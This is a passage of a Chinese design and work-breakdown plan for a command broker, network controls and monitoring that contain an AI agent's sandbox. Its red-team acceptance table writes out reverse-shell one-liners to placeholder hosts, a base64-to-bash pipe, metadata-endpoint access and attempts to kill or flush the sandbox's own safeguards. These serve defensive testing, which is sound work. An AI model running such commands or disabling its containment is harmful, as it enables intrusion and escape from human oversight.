- T11（requireApproval 链路联调）→ 随 E1/E4 线推进；
- D2 全段探测 → 低优先（出站主管控已由 userns+Broker 覆盖，平台 NetworkPolicy 兜底）；
- E1–E6 跨团队 → 未启动；C6 平台需求单 → **已成稿**（见《平台需求单》）。

---

## 第二部分：实现工作分解（按依赖排序）

> ⚠️ **v1.2 注记**：A4/B5 结论后，下表中工作项 2（Daemon 骨架）、3（Exec Broker）、6（文件管控）、7（网络管控）的技术路线已变（见第一部分小结 v2"机制可用性重推"与"B5 带来的架构简化"）。本表待设计文档 v1.2 定稿后整体重排，此处先冻结原表备查。

| # | 工作项 | 内容 | 依赖 |
|---|--------|------|------|
| 0 | 环境摸底 | ✅ **完成**（2026-11-23）：全部确认项闭环（结论见《设计文档》v1.2 §7 机制可用性终态表）；产出《平台需求单》 | — |
| 1 | 镜像改造 | 裁剪危险工具（B2 已具体化：ssh 必删、gcc 评估、yum/pip/npm 默认灰）、建非 root 用户、目录规划（`/workspace`、`/run/safe`、策略目录）、预置私有 CA（如启用 TLS 拦截）、内置 Daemon 二进制（**arm64**）与 iptables | 0 |
| 2 | Daemon 骨架 | Go 实现：PID 1、僵尸进程回收、自身守护；策略引擎（Schema 解析、签名校验、版本管理、热更新、离线缓存） | 0 |
| 3 | Exec Broker | Unix socket 服务；命令解析（tokenize、软链展开、base64 递归解码）；三名单匹配；verdict 状态机；结构化错误码；**spawn 降权执行器**（setuid→Agent 用户、清 cap、no_new_privs、seccomp 加载）；OpenClaw 集成（依 B5 结论） | 1, 2, E1 |
| 4 | 脚本扫描器 | 分语言危险 API 规则集（socket+dup2+pty 组合直接黑；覆盖 perl/lua/node，评估 Chrome/LibreOffice 面）；`pip/npm install` 默认灰；OBS 上传客户端 + 哈希缓存；云扫判定接口 | 3, E5 |
| 5 | 审批链路 | pending 队列、云侧回调、超时默认拒绝、授权累积 ledger（需求 7 的 scope token 来源） | 3, E4 |
| 6 | 文件管控 | 挂载方案落地（**A2 已确认 AppArmor 不可用 → 纯 bind mount**）；fanotify 灰名单监听（A6 实测后启用）；删除隔离区（mv + 确认真删） | 2, 5 |
| 7 | 网络管控 | Daemon init 时装配 iptables（owner match、DROP 元数据/内网——**K8s service/pod CIDR 例外先行**、INPUT DROP）；egress proxy（CONNECT 限 443、域名 ACL、大小/超时/会话限制、TLS 拦截[拍板项]、beacon 检测）；内部 DNS resolver（限速/记录类型/高熵检测）；gateway 反代 + 鉴权；**评估 K8s NetworkPolicy 作为纵深** | 0(D), 2 |
| 8 | 反连 shell 检测器 | /proc fd 扫描（fd0/1/2 为 socket——**以 root 身份实测可行性，B7**）、pty 审计、异常父子关系；freeze→取证→kill→上报 | 3, 7 |
| 9 | 事件总线 + HIPS 插件口 | 事件 Schema 实现、socket 服务、缓冲重发；HIPS 判定回写转阻断 | 2, E2 |
| 10 | 云侧控制面 | 策略管理 + 签名推送；审批服务；scope 服务；OBS 签名 URL；云扫服务 | E3–E6 |
| 11 | 测试验证 | **攻击用例集**（见第三部分）；性能测试（Broker 延迟、fanotify 开销、proxy 吞吐）；降级路径验证（关掉 TLS 拦截重跑用例；AppArmor 已确认不可用，降级路径即默认路径） | 3–9 |
| 12 | 灰度上线 | 审计模式（全量 log-only，观察误报）→ 按类目逐个切 enforce | 11 |

## 第三部分：验收攻击用例集（红队清单）

上线前每条必须通过（预期：阻断或灰名单确认 + 审计事件）：

| 类别 | 用例 |
|------|------|
| 直接反连 | `bash -i >& /dev/tcp/<外部IP>/4444 0>&1`；`nc <IP> 4444 -e /bin/sh`；python socket+dup2+pty.spawn 经典一行 |
| 隧道反连 | chisel/frp 客户端外连（含 **yum/pip 安装后使用**的情形）；`ssh -R`（镜像现有 ssh client，裁剪前后各测一遍）；WebSocket shell 经 443 |
| 编码绕过 | `echo <base64> \| base64 -d \| bash`；软链接改名执行 |
| 脚本内攻击 | py 脚本内 `os.system("rm -rf …")` / `subprocess` 反连 / 读灰名单文件 |
| 安装时执行 | `pip install <含恶意 setup.py 的包>`；npm postinstall；**`yum install nmap-ncat` 后反连** |
| 横向 | `curl 169.254.169.254`（现状平台已封，验证沙箱侧 iptables 独立生效）；探测内网网关以外地址；**访问 K8s API（10.247.0.1）与 SA token** |
| 反安全组件 | kill Daemon；改写策略文件；`iptables -F`；`ptrace` Daemon |
| 批量删除 | `rm -rf` 工作目录多文件；脚本循环删除 |
| 数据外发 | 大文件经 proxy 外发（大小限制）；DNS 隧道（iodine 特征） |

## 第四部分：需要拍板的决策

1. **命令默认策略**：default-allow（常规开发命令放行、高危类目拦）还是全量 default-deny 白名单（安全最强、运维最重）——建议前者起步；
2. **TLS 拦截**是否启用（对抗 HTTPS 隧道的强度分水岭，影响开发体验与 CA 运维）；
3. **审批超时行为**：必须默认拒绝（默认放行等于灰名单失效）；
4. **OpenClaw 集成方式**：取决于 B5 摸底结论，是最优先要闭环的事项；
5. egress proxy 选型：Squid（ssl-bump 成熟）vs Envoy vs 自研轻量 CONNECT proxy（行为检测定制空间大）。
